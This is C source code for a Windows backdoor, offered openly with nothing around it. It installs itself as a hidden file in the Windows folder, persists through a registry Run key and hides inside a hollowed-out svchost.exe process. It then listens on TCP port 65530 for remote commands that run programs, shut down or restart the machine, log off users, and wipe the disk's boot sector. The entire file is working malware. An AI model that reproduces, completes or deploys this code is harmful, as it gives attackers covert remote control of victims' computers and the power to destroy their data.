#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"ntdll.lib")

#define BACKDOOR_CREATE_PROCESS 0
#define BACKDOOR_SHELL_EXECUTE 1
#define BACKDOOR_SHUTDOWN_SYSTEM 2
#define BACKDOOR_RESTART_SYSTEM 3
#define BACKDOOR_LOGOFF 4
#define BACKDOOR_FORCE_SHUTDOWN 5
#define BACKDOOR_FORCE_RESTART 6
#define BACKDOOR_WIPE_DISK 7

typedef enum _SHUTDOWN_ACTION
{
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
}SHUTDOWN_ACTION,*PSHUTDOWN_ACTION;

typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
}CLIENT_ID,*PCLIENT_ID;

typedef struct _BACKDOOR_PACKET
{
	BYTE Operation;
	char Buffer[1024];
	CLIENT_ID ClientId;
}BACKDOOR_PACKET,*PBACKDOOR_PACKET;

EXTERN_C NTSTATUS NTAPI RtlCreateUserThread(
HANDLE,
PSECURITY_DESCRIPTOR,
BOOLEAN,
ULONG,
PULONG,
PULONG,
PVOID,
PVOID,
PHANDLE,
PCLIENT_ID);

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtOpenProcess(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PCLIENT_ID);
EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE,NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE,PVOID,PVOID,ULONG,PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE,PVOID,PVOID,ULONG,PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE,PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE,PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE,PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE,PULONG);
EXTERN_C NTSTATUS NTAPI NtShutdownSystem(SHUTDOWN_ACTION);

DWORD WINAPI ServerThread(PVOID Parameter)
{
	SOCKET lsSock,ctSock;
	PBACKDOOR_PACKET data;
	HANDLE hProcess,hMutex,hFile;
	ULONG i;
	DWORD write;
	BOOLEAN bl;
	char GarbageData[512];

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WSADATA wd;
	sockaddr_in sai;
	CLIENT_ID cid;
	OBJECT_ATTRIBUTES oa;

	hMutex=CreateMutex(NULL,TRUE,"{EDFF96B3-5333-47AE-8DE6-022BB460FD36}");

	if(GetLastError()==ERROR_ALREADY_EXISTS)
	{
		return 0;
	}

	for(i=0;i<100;i++)
	{
		RtlAdjustPrivilege(i,TRUE,FALSE,&bl);
	}

	if(WSAStartup(0x101,&wd)!=0)
	{
		return 1;
	}

	sai.sin_family=AF_INET;
	sai.sin_addr.s_addr=INADDR_ANY;
	sai.sin_port=htons(65530);

	data=(PBACKDOOR_PACKET)VirtualAlloc(NULL,65536,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

	lsSock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

	if(lsSock==INVALID_SOCKET)
	{
		WSACleanup();
		return 1;
	}

	bind(lsSock,(sockaddr*)&sai,sizeof(sai));
	listen(lsSock,10);

	while(1)
	{
		ctSock=accept(lsSock,NULL,NULL);

		if(ctSock==INVALID_SOCKET)
		{
			closesocket(lsSock);

			WSACleanup();
			return 1;
		}

		recv(ctSock,(char*)data,65536,0);

		switch(data->Operation)
		{
		    case BACKDOOR_CREATE_PROCESS:

				memset(&si,0,sizeof(si));
				memset(&pi,0,sizeof(pi));

				if(!CreateProcess(NULL,data->Buffer,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi))
				{
					send(ctSock,"Error: Unable to create process.",strlen("Error: Unable to create process."),0);
					break;
				}

				send(ctSock,"Process successfully created.",strlen("Process successfully created."),0);

				NtClose(pi.hThread);
				NtClose(pi.hProcess);
				break;

			case BACKDOOR_SHELL_EXECUTE:
				ShellExecute(0,"open",data->Buffer,NULL,NULL,SW_SHOW);
				send(ctSock,"",1,0);
				break;
			case BACKDOOR_SHUTDOWN_SYSTEM:
				send(ctSock,"Shutting down remote computer.",strlen("Shutting down remote computer."),0);
				ExitWindowsEx(EWX_SHUTDOWN,0);
				break;
			case BACKDOOR_RESTART_SYSTEM:
				send(ctSock,"Restarting remote computer.",strlen("Restarting remote computer."),0);
				ExitWindowsEx(EWX_REBOOT,0);
				break;
			case BACKDOOR_LOGOFF:
				send(ctSock,"Logging off the user.",strlen("Logging off the user."),0);
				ExitWindowsEx(EWX_LOGOFF,0);
				break;
			case BACKDOOR_FORCE_SHUTDOWN:
				send(ctSock,"Shutting down remote computer.",strlen("Shutting down remote computer."),0);
				NtShutdownSystem(ShutdownNoReboot);
				break;
			case BACKDOOR_FORCE_RESTART:
				send(ctSock,"Restarting remote computer.",strlen("Restarting remote computer."),0);
				NtShutdownSystem(ShutdownReboot);
				break;
			case BACKDOOR_WIPE_DISK:
				
				memset(GarbageData,0xFF,512);

				hFile=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);

				if(hFile!=INVALID_HANDLE_VALUE)
				{
					if(!WriteFile(hFile,GarbageData,512,&write,NULL))
					{
						send(ctSock,"Error: Unable to overwrite hard disk.",strlen("Error: Unable to overwrite hard disk."),0);
					}

					send(ctSock,"Successfully overwritten hard disk.",strlen("Successfully overwritten hard disk."),0);
					NtClose(hFile);
					break;
				}

				send(ctSock,"Error: Unable to open the hard disk.",strlen("Unable to open the hard disk."),0);
				break;

			default:
				send(ctSock,"Error: Invalid command.",strlen("Error: Invalid command."),0);
				break;
		}

		memset(data,0,sizeof(BACKDOOR_PACKET));
	}
	
	Sleep(INFINITE);
	return 0;
}

int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow)
{
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	char szWindir[60],szModuleFileName[260];
	HKEY hKey;
	PVOID image,mem,base;
	DWORD read,nSizeOfFile;
	WORD i;
	HANDLE hFile;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;

	if(!strcmp("-k UserService",lpCmdLine))
	{
		CreateThread(NULL,0,ServerThread,NULL,0,NULL);
		ExitThread(0);
	}

	ctx.ContextFlags=CONTEXT_FULL;

	memset(&si,0,sizeof(si));
	memset(&pi,0,sizeof(pi));

	GetEnvironmentVariable("windir",szWindir,60);
	GetModuleFileName(NULL,szModuleFileName,260);

	strcat(szWindir,"\\CppServer.exe");

	CopyFile(szModuleFileName,szWindir,FALSE);
	SetFileAttributes(szWindir,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);

	RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
	RegSetValueEx(hKey,"{EDFF96B3-5333-47AE-8DE6-022BB460FD36}",0,REG_SZ,(LPBYTE)szWindir,strlen(szWindir));
	RegCloseKey(hKey);

	hFile=CreateFile(szWindir,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);

	if(hFile!=INVALID_HANDLE_VALUE)
	{
		nSizeOfFile=GetFileSize(hFile,NULL);

		image=VirtualAlloc(NULL,nSizeOfFile,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

		if(!ReadFile(hFile,image,nSizeOfFile,&read,NULL))
		{
			NtClose(hFile);
			VirtualFree(image,0,MEM_RELEASE);

			CreateThread(NULL,0,ServerThread,NULL,0,NULL);
			ExitThread(0);
		}
	}

	NtClose(hFile);

	pIDH=(PIMAGE_DOS_HEADER)image;
	pINH=(PIMAGE_NT_HEADERS)((LPBYTE)image+pIDH->e_lfanew);

	if(CreateProcess(NULL,"svchost.exe -k UserService",NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&si,&pi))
	{
		NtGetContextThread(pi.hThread,&ctx);
		NtReadVirtualMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&base,sizeof(PVOID),NULL);

		if((DWORD)base==pINH->OptionalHeader.ImageBase)
		{
			NtUnmapViewOfSection(pi.hProcess,base);
		}

		mem=VirtualAllocEx(pi.hProcess,(PVOID)pINH->OptionalHeader.ImageBase,pINH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);

		if(!mem)
		{
			NtTerminateProcess(pi.hProcess,1);
			VirtualFree(image,0,MEM_RELEASE);

			NtClose(pi.hThread);
			NtClose(pi.hProcess);

			CreateThread(NULL,0,ServerThread,NULL,0,NULL);
			ExitThread(0);
		}

		NtWriteVirtualMemory(pi.hProcess,mem,image,pINH->OptionalHeader.SizeOfHeaders,NULL);

		for(i=0;i<pINH->FileHeader.NumberOfSections;i++)
		{
			pISH=(PIMAGE_SECTION_HEADER)((LPBYTE)image+pIDH->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(i*sizeof(IMAGE_SECTION_HEADER)));
			NtWriteVirtualMemory(pi.hProcess,(PVOID)((LPBYTE)mem+pISH->VirtualAddress),(PVOID)((LPBYTE)image+pISH->PointerToRawData),pISH->SizeOfRawData,NULL);
		}

		ctx.Eax=(DWORD)((LPBYTE)mem+pINH->OptionalHeader.AddressOfEntryPoint);

		NtWriteVirtualMemory(pi.hProcess,(PVOID)(ctx.Ebx+8),&pINH->OptionalHeader.ImageBase,sizeof(PVOID),NULL);
		NtSetContextThread(pi.hThread,&ctx);

		NtResumeThread(pi.hThread,NULL);

		NtClose(pi.hThread);
		NtClose(pi.hProcess);
	}

	return 0;
}